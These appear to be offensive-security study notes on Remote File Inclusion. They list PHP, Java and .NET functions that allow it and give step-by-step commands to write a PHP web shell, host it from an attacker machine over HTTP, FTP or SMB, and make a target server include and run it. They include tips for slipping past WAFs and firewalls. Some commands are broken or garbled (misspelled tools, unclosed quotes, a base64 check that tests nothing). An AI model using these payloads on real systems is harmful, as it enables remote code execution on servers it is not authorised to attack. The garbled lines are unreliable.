# Remote File Inclusion (RFI)
***
#### When we are able to include remote files we may enumerate local-only ports and web applications and even include scripts hosted on our machines to execute remote code.

### Functions that may allow RFI:
| Language | Function                 | Read Content | Execute | Remote URL |
|----------|---------------------------|--------------|---------|------------|
| **PHP**  | `include()` / `include_once()` | ✅         | ✅      | ✅         |
|          | `file_get_contents()`     | ✅           | ❌       | ✅         |
| **Java** | `import`                  | ✅           | ✅      | ✅         |
| **.NET** | `@Html.RemotePartial()`    | ✅           | ❌       | ✅         |
|          | `include`                 | ✅           | ✅      | ✅         |

### Checking RFI
#### In PHP, it is only possible to include remote URLs when the `allow_url_include` option is enabled.
```
echo 'MTMzNwo=' | base64 -d | grep allow_url_include
```
#### Even when the setting is enabled we may not able to execute RFI. One of the most common ways to test if it is vulnerable to RFI after spotting LFI is to simply input a remote URL to a website and see if we can get its content.
#### We should allways include a local file URL, so it does not get blocked by a firewall or other protections.
#### Example:
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=http://127.0.0.1:80/index.php
```
#### When the included page from the inputted URL does get rendered as PHP, we may perform RCE if we include a PHP script on our machine.

#### **NOTE:** By including the vulnerable page , we may cause a recursive inclusion loop and cause a DoS to the server.

### Remote Code Execution
#### Firstly we craft our malicious script, for instance a simple web shell:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
#### Then we could simply host our script and include it on the vulnerable URL. For better results we should use common HTTP port `80` or `443`to avoid being whitelisted by the web application firewall. Additionally , we may host the script through an FTP or an SMB service.


### HTTP
#### Example of a simple server using python
```bash
$ sudo pyhton3 -m http.server <PORT>
```
#### Then we can include our local shell through RFI
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=http://<Attacker_IP>:<Attacker_PORT/shell.php&cmd=id
```

### FTP
#### Basic FTP server using Python's `pyftpdlib` :
```bash
$ sudo python -m pyftpdlib -p 21
```
#### This may be useful when a WAF is in place blocking the `http://` string or even when a firewall is filtering out http ports.
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=ftp://user:pass@localhost/shell.php&cmd=id
```

### SMB
#### When we are facing a web application which is running on a Windows server, then we don't need the `allow_url_include` option to be enabled for the exploitation of RFI , as we can use the SMB protocol for it.
#### SMD server using `Impacket's smbserver.py`:
```bash
$ impacket-smbserver -smb2support share $(pwd)
```
```bash
$ curl -s 'http://<SERVER>:<PORT>/index.php?lang=\\<IP>\share\shell.php&cmd=id
```